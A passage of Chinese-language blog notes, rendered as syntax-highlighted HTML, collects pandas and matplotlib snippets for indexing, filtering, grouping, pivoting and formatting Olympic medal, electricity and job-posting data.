class="line">df1[<span class="string">&#x27;A&#x27;</span>] = df1[<span class="string">&#x27;A&#x27;</span>].<span class="built_in">map</span>(&#123;<span class="string">&#x27;A0&#x27;</span>:<span class="string">&#x27;cat&#x27;</span>,<span class="string">&#x27;A3&#x27;</span>:<span class="string">&#x27;rabbit&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># map ignore</span></span><br><span class="line">df1[<span class="string">&#x27;B&#x27;</span>] = df1[<span class="string">&#x27;B&#x27;</span>].<span class="built_in">map</span>(<span class="keyword">lambda</span> x:<span class="string">f&#x27;<span class="subst">&#123;x&#125;</span> 今天关注了早起Python&#x27;</span>, na_action=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#applymap可以对整个 dataframe 工作，现在将 df1 的最后三列保留两位小数</span></span><br><span class="line"></span><br><span class="line">df1[[<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;F&#x27;</span>]] = df1[[<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;F&#x27;</span>]].applymap(<span class="keyword">lambda</span> x:<span class="built_in">format</span>(x,<span class="string">&#x27;.2f&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3><span id="索引">索引</span></h3><ul><li><code>reset_index</code>用于将索引还原成默认值，即从0开始步长为1的数组。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">q1_df[<span class="string">&#x27;rate&#x27;</span>] = [x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(q1_df[<span class="string">&#x27;AT_HOME&#x27;</span>])+<span class="number">1</span>)]</span><br><span class="line"><span class="comment"># 如果索引不是默认</span></span><br><span class="line">q1_df.reset_index().set_index(q1_df[<span class="string">&#x27;rate&#x27;</span>])</span><br><span class="line"><span class="comment"># 如果是默认</span></span><br><span class="line">q1_df.set_index(q1_df[<span class="string">&#x27;rate&#x27;</span>],inplace=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># 删除索引</span></span><br><span class="line">max_data=max_data.reset_index(drop=<span class="literal">True</span>).set_index(max_data[<span class="string">&#x27;DATA_DATE&#x27;</span>])</span><br><span class="line"><span class="comment"># 修改索引名</span></span><br><span class="line">df.rename_axis([<span class="string">&quot;行政区&quot;</span>, <span class="string">&quot;公司规模&quot;</span>],inplace=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h3><span id="坐标轴显示百分比">坐标轴显示百分比</span></h3><ul><li>第一种方法</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> matplotlib.ticker <span class="keyword">import</span> FuncFormatter</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">to_percent</span>(<span class="params">temp, position</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;%1.0f&#x27;</span>%(<span class="number">100</span>*temp) + <span class="string">&#x27;%&#x27;</span></span><br><span class="line">plt.gca().yaxis.set_major_formatter(FuncFormatter(to_percent))</span><br></pre></td></tr></table></figure><ul><li>推荐</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ax.set_yticklabels([<span class="string">&#x27;0%&#x27;</span>,<span class="string">&#x27;10%&#x27;</span>,<span class="string">&#x27;20%&#x27;</span>,<span class="string">&#x27;30%&#x27;</span>,<span class="string">&#x27;40%&#x27;</span>,<span class="string">&#x27;50%&#x27;</span>])</span><br></pre></td></tr></table></figure><h3><span id="apply">apply</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 构建apply函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">judge_state</span>(<span class="params">row</span>):</span><br><span class="line">    <span class="keyword">if</span> row[<span class="string">&#x27;Austin - EV&#x27;</span>] &lt;=<span class="number">0.01</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Off&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> row[<span class="string">&#x27;Austin - EV&#x27;</span>]&gt;<span class="number">0.01</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;On&#x27;</span></span><br><span class="line"><span class="comment"># 应用apply函数</span></span><br><span class="line">df_Austin_ev = df.apply(judge_state,axis = <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保留2位小数，如23.12%</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">turn_percentage</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;%.2f%%&#x27;</span> % (x * <span class="number">100</span>)</span><br><span class="line"><span class="comment"># 应用自定义函数</span></span><br><span class="line">ratio=ratio[<span class="string">&#x27;Austin - EV&#x27;</span>].apply(turn_percentage)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 我们将会用到 transform 而不是 apply。 原因是， transform 将会保持 dataframe 矩阵的形状(shape)(就是行列数不变)而 apply 会改变矩阵的形状。</span></span><br></pre></td></tr></table></figure><h3><span id="重采样">重采样</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 重采样</span></span><br><span class="line">df[<span class="string">&#x27;购买月份&#x27;</span>] = pd.to_datetime(df.日期).dt.to_period(<span class="string">&quot;M&quot;</span>)</span><br></pre></td></tr></table></figure><h3><span id="del">del</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">del</span> df[<span class="string">&#x27;a&#x27;</span>]</span><br><span class="line"><span class="comment"># 等价于</span></span><br><span class="line">df.drop(<span class="string">&#x27;a&#x27;</span>,axis=<span class="number">1</span>,inplace=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h3><span id="按时间筛选">按时间筛选</span></h3><ul><li>第一种</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将DateTime转成日期格式</span></span><br><span class="line">df[<span class="string">&#x27;DateTime&#x27;</span>] = pd.to_datetime(df[<span class="string">&#x27;DateTime&#x27;</span>])</span><br><span class="line"><span class="comment"># 将日期设为index</span></span><br><span class="line">df = df.set_index(<span class="string">&#x27;DateTime&#x27;</span>)</span><br><span class="line"><span class="comment"># 筛选从2019年3月1号到2019年3月10号整十天的电网数据</span></span><br><span class="line">df1 = df[<span class="string">&#x27;2019-03-01&#x27;</span>:<span class="string">&#x27;2019-03-10&#x27;</span>]</span><br></pre></td></tr></table></figure><ul><li>第二种<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 设置开始时间</span><br><span class="line">from_date = df[&#x27;DATA_DATE&#x27;]&gt;=&#x27;2021-01-01&#x27;</span><br><span class="line"># 设置结束时间</span><br><span class="line">to_date = df[&#x27;DATA_DATE&#x27;]&lt;=&#x27;2021-03-31&#x27;</span><br><span class="line"># 筛选数据时间段</span><br><span class="line">df = df[from_date&amp;to_date]</span><br></pre></td></tr></table></figure></li></ul><h3><span id="显示中文">显示中文</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># win设置中文</span></span><br><span class="line">plt.rcParams[<span class="string">&#x27;font.sans-serif&#x27;</span>]=[<span class="string">&#x27;SimHei&#x27;</span>] <span class="comment">#用来正常显示中文标签</span></span><br><span class="line">plt.rcParams[<span class="string">&#x27;axes.unicode_minus&#x27;</span>] = <span class="literal">False</span> <span class="comment">#用来正常显示负号</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># mac设置中文</span></span><br><span class="line">plt.rcParams[<span class="string">&#x27;font.family&#x27;</span>] = <span class="string">&#x27;Heiti TC&#x27;</span><span class="comment">#用来正常显示中文标签</span></span><br><span class="line">plt.rcParams[<span class="string">&#x27;axes.unicode_minus&#x27;</span>] = <span class="literal">False</span> <span class="comment">#用来正常显示负号</span></span><br></pre></td></tr></table></figure><h3><span id="重命名">重命名</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 重命名 列</span></span><br><span class="line">q4_df.rename(columns=&#123;<span class="string">&#x27;AT_HOME&#x27;</span>:<span class="string">&#x27;empty_ratio&#x27;</span>&#125;,inplace=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># 重命名 索引</span></span><br><span class="line">df.rename_axis(<span class="string">&quot;金牌排名&quot;</span>,inplace=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h3><span id="填充">填充</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">bfill 从后面往前填充</span></span><br><span class="line"><span class="string">ffill 从前往后</span></span><br><span class="line"><span class="string">默认列方向填充0，1使用行方向</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 新增一列 最多奖牌数量 列，值为该国 金、银、铜 牌数量中最多的一个奖牌数量</span></span><br><span class="line">df[<span class="string">&#x27;最多奖牌数量&#x27;</span>] = df.bfill(<span class="number">1</span>)[[<span class="string">&quot;金牌数&quot;</span>, <span class="string">&quot;银牌数&quot;</span>,<span class="string">&#x27;铜牌数&#x27;</span>]].<span class="built_in">max</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3><span id="查询">查询</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查询</span></span><br><span class="line">df.query(<span class="string">&#x27;金牌数+银牌数 &gt; 15&#x27;</span>)</span><br><span class="line"></span><br><span class="line">df[df.国家奥委会.<span class="built_in">str</span>.contains(<span class="string">&#x27;国&#x27;</span>)]</span><br><span class="line"></span><br><span class="line">df_01.loc[df_01[<span class="string">&#x27;行业（按行业大类）&#x27;</span>].isin([<span class="string">&#x27;工业&#x27;</span>,<span class="string">&#x27;建筑业&#x27;</span>])]</span><br><span class="line">df_01.loc[(df_01[<span class="string">&#x27;行业（按行业大类）&#x27;</span>]==<span class="string">&#x27;工业&#x27;</span>)|(df_01[<span class="string">&#x27;行业（按行业大类）&#x27;</span>]==<span class="string">&#x27;建筑业&#x27;</span>)]</span><br><span class="line">df_01[df_01[<span class="string">&#x27;行业（按行业大类）&#x27;</span>].<span class="built_in">str</span>.contains(<span class="string">&#x27;工业|建筑业&#x27;</span>)]</span><br></pre></td></tr></table></figure><h3><span id="选择类型">选择类型</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">df4.select_dtypes(include=[<span class="string">&#x27;int&#x27;</span>,<span class="string">&#x27;float64&#x27;</span>])</span><br><span class="line">df4.select_dtypes(exclude=[<span class="string">&#x27;int&#x27;</span>,<span class="string">&#x27;float64&#x27;</span>])</span><br></pre></td></tr></table></figure><h3><span id="数据展开">数据展开</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df5.explode([<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;C&#x27;</span>])</span><br></pre></td></tr></table></figure><h3><span id="数据累加">数据累加</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">df[<span class="built_in">list</span>(<span class="string">&#x27;ABCD&#x27;</span>)].cumsum()</span><br><span class="line">df[<span class="built_in">list</span>(<span class="string">&#x27;ABCD&#x27;</span>)].cumsum(axis = <span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3><span id="列操作">列操作</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 插入列</span></span><br><span class="line">tmp3 = (df[<span class="string">&#x27;春节期间（除夕至初六）用电量&#x27;</span>]-df[<span class="string">&#x27;节前温度接近的一周用电量&#x27;</span>])/df[<span class="string">&#x27;节前温度接近的一周用电量&#x27;</span>]</span><br><span class="line">tmp1 = df.iloc[:,:<span class="number">1</span>]</span><br><span class="line">tmp2 = df.iloc[:,<span class="number">1</span>:]</span><br><span class="line">df = pd.concat([tmp1,tmp3.to_frame(),tmp2],axis=<span class="number">1</span>,ignore_index=<span class="literal">True</span>)</span><br><span class="line">df.columns=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>]</span><br><span class="line">df</span><br><span class="line"><span class="comment"># 删除列</span></span><br><span class="line">df.drop(<span class="string">&#x27;rate&#x27;</span>,<span class="number">1</span>)</span><br><span class="line"><span class="comment"># 新增列</span></span><br><span class="line">df[<span class="string">&#x27;比赛地点&#x27;</span>] = <span class="string">&#x27;东京&#x27;</span></span><br><span class="line"><span class="comment"># 新增一列 最多奖牌数量 列，值为该国 金、银、铜 牌数量中最多的一个奖牌数量 例如美国银牌最多，则为41，中国为38 bfill默认跨行填充</span></span><br><span class="line">df[<span class="string">&#x27;最多奖牌数量&#x27;</span>] = df.bfill(<span class="number">1</span>)[[<span class="string">&quot;金牌数&quot;</span>, <span class="string">&quot;银牌数&quot;</span>,<span class="string">&#x27;铜牌数&#x27;</span>]].<span class="built_in">max</span>(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># 如果一个国家的金牌数大于 30 则值为 是，反之为 否</span></span><br><span class="line">df[<span class="string">&#x27;金牌大于30&#x27;</span>]  = np.where(df[<span class="string">&#x27;金牌数&#x27;</span>] &gt; <span class="number">30</span>, <span class="string">&#x27;是&#x27;</span>, <span class="string">&#x27;否&#x27;</span>)</span><br><span class="line"><span class="comment"># 删除 df 的 7、8、9、10 列</span></span><br><span class="line">df.drop(df.columns[[<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>]], axis=<span class="number">1</span>,inplace=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># 提取第1，2，3，4列</span></span><br><span class="line">df.iloc[:,<span class="number">0</span>:<span class="number">4</span>] </span><br><span class="line">df.iloc[:,[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]]</span><br><span class="line"><span class="comment"># 提取 金牌数、银牌数、铜牌数 三列</span></span><br><span class="line">df[[<span class="string">&#x27;金牌数&#x27;</span>,<span class="string">&#x27;银牌数&#x27;</span>,<span class="string">&#x27;铜牌数&#x27;</span>]]</span><br><span class="line"><span class="comment"># 提取全部列名中以 “数” 结尾的列</span></span><br><span class="line">df.loc[:, df.columns.<span class="built_in">str</span>.endswith(<span class="string">&#x27;数&#x27;</span>)]</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3><span id="行操作">行操作</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 插入行 先切分再插入</span></span><br><span class="line">df1 = df.iloc[:<span class="number">1</span>, :]</span><br><span class="line">df2 = df.iloc[<span class="number">1</span>:, :]</span><br><span class="line">df3 = pd.DataFrame([[i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(df.columns))]], columns=df.columns)</span><br><span class="line">df_new = pd.concat([df1, df3, df2], ignore_index=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># 删除第一行</span></span><br><span class="line">df.drop(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># 条件删除</span></span><br><span class="line">df.drop(df[df.金牌数&lt;<span class="number">20</span>].index)</span><br><span class="line"><span class="comment"># 提取倒数后三列的10-20行</span></span><br><span class="line">df.iloc[<span class="number">10</span>:<span class="number">20</span>,-<span class="number">3</span>:]</span><br><span class="line">df.loc[<span class="number">10</span>:<span class="number">20</span>, <span class="string">&#x27;总分&#x27;</span>:] </span><br><span class="line"><span class="comment"># 提取第 10 行 </span></span><br><span class="line"><span class="comment"># DataFrame格式</span></span><br><span class="line">a = df.loc[<span class="number">9</span>:<span class="number">9</span>]</span><br><span class="line"><span class="comment"># Series格式</span></span><br><span class="line">a = df.loc[<span class="number">9</span>,:]</span><br><span class="line"><span class="comment"># 提取第 10 行之后的全部行</span></span><br><span class="line">df.iloc[<span class="number">9</span>:,]</span><br><span class="line">df.iloc[<span class="number">9</span>:]</span><br><span class="line">df.loc[<span class="number">9</span>:]</span><br><span class="line"><span class="comment"># 提取 0-50 行，间隔为 3</span></span><br><span class="line">df[:<span class="number">50</span>:<span class="number">3</span>]</span><br><span class="line"><span class="comment"># 提取 金牌数 不等于 10 的行</span></span><br><span class="line">df.loc[~(df[<span class="string">&#x27;金牌数&#x27;</span>] == <span class="number">10</span>)]</span><br><span class="line"><span class="comment"># 提取奇数行</span></span><br><span class="line">df[[i%<span class="number">2</span>==<span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(df.index))]]</span><br><span class="line"><span class="comment"># 提取 中国、美国、英国、日本、巴西 五行数据 且 金牌数小于30</span></span><br><span class="line">df.loc[(df[<span class="string">&#x27;金牌数&#x27;</span>] &lt; <span class="number">30</span>) &amp; (df[<span class="string">&#x27;国家奥委会&#x27;</span>].isin([<span class="string">&#x27;中国&#x27;</span>,<span class="string">&#x27;美国&#x27;</span>,<span class="string">&#x27;英国&#x27;</span>,<span class="string">&#x27;日本&#x27;</span>,<span class="string">&#x27;巴西&#x27;</span>]))]</span><br><span class="line"><span class="comment"># 包含某个字的行</span></span><br><span class="line">df[df.国家奥委会.<span class="built_in">str</span>.contains(<span class="string">&#x27;国&#x27;</span>)]</span><br><span class="line"><span class="comment"># 提取 第 0-2 行第 0-2 列</span></span><br><span class="line">df.iloc[<span class="number">0</span>:<span class="number">2</span>,<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">df.iloc[<span class="number">0</span>:<span class="number">2</span>,[<span class="number">0</span>,<span class="number">1</span>]]</span><br><span class="line"><span class="comment"># 使用 query 提取 金牌数 + 银牌数 大于 15 的国家</span></span><br><span class="line">df.query(<span class="string">&#x27;金牌数+银牌数 &gt; 15&#x27;</span>)</span><br><span class="line"><span class="comment"># 使用 query 提取 金牌数 大于 金牌均值的国家</span></span><br><span class="line">gold_mean = df[<span class="string">&#x27;金牌数&#x27;</span>].mean()</span><br><span class="line">df.query(<span class="string">f&#x27;金牌数 &gt; <span class="subst">&#123;gold_mean&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment"># 指定位置插入行</span></span><br><span class="line">df1 = df.iloc[:<span class="number">1</span>, :]</span><br><span class="line">df2 = df.iloc[<span class="number">1</span>:, :]</span><br><span class="line">df3 = pd.DataFrame([[i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(df.columns))]], columns=df.columns)</span><br><span class="line">df_new = pd.concat([df1, df3, df2], ignore_index=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># 调整 顺序</span></span><br><span class="line">q4_df = q4_df.reindex([<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">22</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>]).reset_index()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3><span id="pivot与groupby">pivot与groupby</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pd.pivot_table(df2,values = [<span class="string">&#x27;奖牌类型&#x27;</span>],index = [<span class="string">&#x27;国家&#x27;</span>,<span class="string">&#x27;运动类别&#x27;</span>],aggfunc = <span class="string">&#x27;count&#x27;</span>)</span><br><span class="line"><span class="comment"># 等价于</span></span><br><span class="line">pd.DataFrame(df2.groupby([<span class="string">&#x27;国家&#x27;</span>,<span class="string">&#x27;运动类别&#x27;</span>]).count()[<span class="string">&#x27;奖牌类型&#x27;</span>])</span><br><span class="line"><span class="comment"># 等价于</span></span><br><span class="line">df2.groupby([<span class="string">&#x27;国家&#x27;</span>,<span class="string">&#x27;运动类别&#x27;</span>]).count()[[<span class="string">&#x27;奖牌类型&#x27;</span>]]</span><br></pre></td></tr></table></figure><h3><span id="unstack">unstack</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 计算前十名各国每日奖牌数量合计</span></span><br><span class="line"><span class="comment"># 注意：对于第一天没有数据的国家用0填充，其余时间的缺失值用上一日数据填充</span></span><br><span class="line">countries = df2.groupby(<span class="string">&#x27;国家&#x27;</span>).count().sort_values(<span class="string">&#x27;奖牌类型&#x27;</span>,ascending=<span class="literal">False</span>).head(<span class="number">10</span>).index.tolist()</span><br><span class="line">tmp = df2[df2[<span class="string">&#x27;国家&#x27;</span>].isin(countries)]</span><br><span class="line">tmp.groupby([<span class="string">&#x27;获奖时间&#x27;</span>,<span class="string">&#x27;国家&#x27;</span>]).count()[<span class="string">&#x27;奖牌类型&#x27;</span>].unstack().cumsum().fillna(<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3><span id="数据聚合">数据聚合</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 分组，但不作为索引</span></span><br><span class="line">df.groupby(<span class="string">&quot;district&quot;</span>, as_index=<span class="literal">False</span>)[<span class="string">&#x27;salary&#x27;</span>].mean()</span><br><span class="line"><span class="comment"># 分组统计</span></span><br><span class="line">df.groupby(<span class="string">&quot;district&quot;</span>)[<span class="string">&#x27;companySize&#x27;</span>].value_counts()</span><br><span class="line"><span class="comment"># 或者groupby两个</span></span><br><span class="line">df.groupby([<span class="string">&#x27;district&#x27;</span>,<span class="string">&#x27;companySize&#x27;</span>])[<span class="string">&#x27;companySize&#x27;</span>].count()</span><br><span class="line"><span class="comment"># 查看group的结果</span></span><br><span class="line">df.groupby([<span class="string">&quot;district&quot;</span>,<span class="string">&#x27;salary&#x27;</span>]).groups</span><br><span class="line"><span class="comment"># 将数据按照 district、salary 进行分组，并查看西湖区薪资为 30000 的工作</span></span><br><span class="line">df.groupby([<span class="string">&quot;district&quot;</span>,<span class="string">&#x27;salary&#x27;</span>]).get_group((<span class="string">&quot;西湖区&quot;</span>,<span class="number">30000</span>))</span><br><span class="line"><span class="comment"># 计算不同行政区(district)，不同规模公司(companySize)出现的次数</span></span><br><span class="line">pd.DataFrame(df.groupby(<span class="string">&quot;district&quot;</span>)[<span class="string">&#x27;companySize&#x27;</span>].value_counts()) <span class="comment">#使用value_counts的方式，有时候比两个groupby好用</span></span><br><span class="line">df.groupby([<span class="string">&#x27;district&#x27;</span>,<span class="string">&#x27;companySize&#x27;</span>]).count().iloc[:,<span class="number">0</span>:<span class="number">1</span>]</span><br><span class="line"><span class="comment"># 分组</span></span><br><span class="line">df[<span class="string">&#x27;salary&#x27;</span>].groupby([df[<span class="string">&#x27;workYear&#x27;</span>], df[<span class="string">&#x27;education&#x27;</span>]]).mean()</span><br><span class="line">df.groupby([<span class="string">&#x27;workYear&#x27;</span>, <span class="string">&#x27;education&#x27;</span>]).mean()[<span class="string">&#x27;salary&#x27;</span>]</span><br><span class="line"><span class="comment"># 在原数据框 df 新增一列，数值为该区的平均薪资水平</span></span><br><span class="line">df[<span class="string">&#x27;该区平均工资&#x27;</span>] = df[[<span class="string">&#x27;district&#x27;</span>,<span class="string">&#x27;salary&#x27;</span>]].groupby(by=<span class="string">&#x27;district&#x27;</span>).transform(<span class="string">&#x27;mean&#x27;</span>)</span><br><span class="line"><span class="comment"># 通过匿名函数分组 根据 createTime 列，计算每天不同 行政区 新增的岗位数量</span></span><br><span class="line">pd.DataFrame(df.groupby([df.createTime.apply(<span class="keyword">lambda</span> x:x.day)])[</span><br><span class="line">             <span class="string">&#x27;district&#x27;</span>].value_counts()).rename_axis([<span class="string">&quot;发布日&quot;</span>, <span class="string">&quot;行政区&quot;</span>])</span><br><span class="line"><span class="comment"># 计算各行政区的企业领域（industryField）包含电商的总数</span></span><br><span class="line">df.groupby(<span class="string">&#x27;district&#x27;</span>)[<span 